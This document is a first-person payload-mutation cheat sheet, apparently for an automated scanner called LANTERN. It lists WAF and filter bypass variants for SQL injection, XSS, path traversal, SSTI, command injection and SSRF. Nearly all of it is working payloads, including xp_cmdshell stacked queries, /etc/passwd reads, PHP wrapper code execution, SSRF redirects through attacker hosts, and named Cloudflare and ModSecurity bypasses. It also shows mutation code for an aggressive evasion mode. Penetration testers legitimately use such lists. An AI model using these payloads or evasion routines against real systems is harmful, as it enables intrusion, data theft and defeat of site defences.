# Payload Mutation & Adaptation

How I modify payloads to bypass WAFs, filters, and defenses.

---

## Why Mutate Payloads

```
Original: ' OR '1'='1
Result: BLOCKED by WAF

Mutation: '/**/OR/**/1=1
Result: SUCCESS - WAF bypassed
```

Mutation is essential because:
1. WAFs block known payloads
2. Filters may catch specific strings
3. Different contexts need different formats
4. Application quirks require custom payloads

---

## SQL Injection Mutations

### Comment Variations

```sql
'--
'-- -
'#
'/*comment*/
'; --
'/**/--
```

### Whitespace Bypass

```sql
'/**/OR/**/1=1
' OR'1'='1
'	OR	1=1    (tabs)
'%09OR%091=1   (URL-encoded tab)
'%0aOR%0a1=1   (newlines)
```

### Case Manipulation

```sql
' oR '1'='1
' Or '1'='1
' OR '1'='1
```

### String Concatenation

```sql
' OR 'a'='a
' OR 'abc'='abc
' OR ''='
```

### Encoding Bypass

```sql
%27%20OR%20%271%27%3D%271   (URL encoded)
%2527                        (double encoded)
\u0027                       (Unicode)
```

### Numeric Alternatives

```sql
' OR 1=1--
' OR 2>1--
' OR 1--
' OR 1<2--
```

### Function Obfuscation

```sql
' OR CHAR(49)=CHAR(49)--
' OR ASCII('a')=ASCII('a')--
' OR 0x31=0x31--
```

### No-Quotes

```sql
1 OR 1=1
1 AND 1=1
1 UNION SELECT 1
```

### Stacked Queries

```sql
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--
'; EXEC xp_cmdshell('whoami')--
```

---

## XSS Mutations

### Tag Variations

```html
<script>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script >alert(1)</script >
<script/x>alert(1)</script>
```

### Event Handler Variations

```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=alert`1`>
<img/src=x/onerror=alert(1)>
<img src=x onerror	=alert(1)>
```

### Alternative Tags

```html
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details ontoggle=alert(1) open>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### Protocol Handlers

```html
<a href=javascript:alert(1)>
<a href=JaVaScRiPt:alert(1)>
<a href="javascript:alert(1)">
<a href=j&#97;vascript:alert(1)>
<a href=&#x6a;avascript:alert(1)>
```

### Encoding Variations

```html
<img src=x onerror=&#97;lert(1)>      (HTML entities)
<img src=x onerror=\u0061lert(1)>     (Unicode)
<img src=x onerror=\x61lert(1)>       (Hex)
```

### No Parentheses

```html
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>
<img src=x onerror=window['alert'](1)>
```

### No Spaces

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

### Breaking Out of Contexts

```html
" onclick=alert(1) x="           (attribute break)
'> <script>alert(1)</script>     (tag break)
</textarea><script>alert(1)</script>  (close tag)
```

---

## LFI/Path Traversal Mutations

### Traversal Sequences

```
../
..\/
....//
....\/
..%2f
..%5c
%2e%2e%2f
%2e%2e/
..%252f    (double encoded)
```

### Null Byte

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\x00
```

### Wrapper Bypass

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input
data://text/plain,<?php system('id') ?>
expect://id
```

### Unicode/Encoding

```
..%c0%af               (overlong UTF-8)
..%c1%9c               (alternative encoding)
%252e%252e%252f        (triple encoded)
```

### Path Normalization

```
/etc/./passwd
/etc/../etc/passwd
/etc/passwd/.
```

---

## SSTI Mutations

### Jinja2/Twig Variations

```
{{7*7}}
{{7*'7'}}
{%print(7*7)%}
{{config}}
{{self.__class__}}
```

### Alternative Delimiters

```
${7*7}           (Freemarker, Velocity)
<%= 7*7 %>       (ERB, EJS)
#{7*7}           (Thymeleaf)
*{7*7}           (Thymeleaf)
```

### Object Access

```
{{''.__class__.__mro__[2].__subclasses__()}}
{{request.application.__globals__}}
{{config.items()}}
{{lipsum.__globals__}}
```

### Filter Bypass

```
{{''|attr('__class__')}}                    (attr filter)
{{request['__class__']}}                     (bracket notation)
{{''.__getattribute__('__class__')}}         (getattribute)
```

---

## Command Injection Mutations

### Command Separators

```
; id
| id
|| id
& id
&& id
`id`
$(id)
```

### Newline Bypass

```
%0aid
%0a id
\nid
```

### Space Bypass

```
cat</etc/passwd
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

### Encoding

```
c\at /etc/passwd
ca''t /etc/passwd
ca""t /etc/passwd
ca\t /etc/passwd
```

### Wildcard Bypass

```
cat /etc/pas?wd
cat /etc/pass*
cat /etc/p[a]sswd
```

---

## SSRF Mutations

### IP Address Bypass

```
http://127.0.0.1/
http://localhost/
http://127.1/
http://0.0.0.0/
http://[::1]/
http://2130706433/           (decimal)
http://0x7f000001/           (hex)
http://017700000001/         (octal)
http://127.0.0.1.nip.io/     (DNS rebind)
```

### Protocol Variations

```
http://internal/
file:///etc/passwd
gopher://internal:6379/
dict://internal:6379/INFO
```

### URL Parsing Confusion

```
http://evil.com@internal/
http://internal#@evil.com
http://internal%40evil.com
http://internal.evil.com     (if allowing *.evil.com)
```

### Redirect Bypass

```
http://attacker.com/redirect?url=http://internal/
```

---

## WAF Bypass Techniques

### Cloudflare Bypass

```sql
'/**/OR/**/1=1
'%00OR%001=1
```

```html
<svg/onload=alert(1)>
<img src=x onerror=prompt(1)>
```

### ModSecurity Bypass

```sql
'/*!50000OR*/1=1
```

```html
<svg onload=alert&lpar;1&rpar;>
```

### General Techniques

1. **Case variation** - Mix upper/lower case
2. **Encoding** - URL, HTML, Unicode, double-encoding
3. **Comments** - Inline comments, variations
4. **Whitespace** - Tabs, newlines, exotic spaces
5. **Alternative syntax** - Same effect, different code
6. **Chunking** - Split across parameters
7. **HTTP pollution** - Multiple parameters

---

## Mutation Strategy

### Step 1: Identify Blocking Pattern

```
Blocked: <script>
Try: <Script> → Blocked
Try: <script > → Blocked
Try: <svg onload=alert(1)> → SUCCESS
```

### Step 2: Apply Systematic Mutations

```python
def mutate_xss(payload):
    mutations = []
    
    mutations.append(payload.replace("<script>", "<Script>"))
    mutations.append(payload.replace("<script>", "<script >"))
    mutations.append(payload.replace("alert", "prompt"))
    mutations.append(payload.replace("<script>alert(1)</script>", 
                                     "<svg onload=alert(1)>"))
    
    for encoded in [html_encode, url_encode, unicode_encode]:
        mutations.append(encoded(payload))
    
    return mutations
```

### Step 3: Record Successful Mutation

```python
if response.vulnerable:
    record_successful_mutation(
        category="xss",
        original=original_payload,
        mutation=working_mutation,
        target=target_url
    )
```

### Step 4: Prioritize for Future Scans

```python
payloads = load_payloads_with_learned("xss")
```

---

## Automated Mutation in LANTERN

### Aggressive Mode

```bash
lantern -t target.com -m xss --aggressive
```

This enables:
- 10x more payloads
- Automatic mutation on block
- WAF bypass attempts
- Encoding variations

### What --aggressive Does

```python
if response_blocked:
    for mutation in generate_mutations(payload):
        result = try_payload(mutation)
        if result.success:
            record_waf_bypass(category, mutation, waf_detected)
            break
```

---

## Summary: My Mutation Approach

1. **Start with base payload** from LANTERN
2. **If blocked**, identify why (WAF, filter, context)
3. **Apply mutations** systematically
4. **Record successes** for learning
5. **Use learned payloads first** on future scans
6. **Report mutation details** to operator

The goal: No WAF or filter should stop a real vulnerability from being detected.
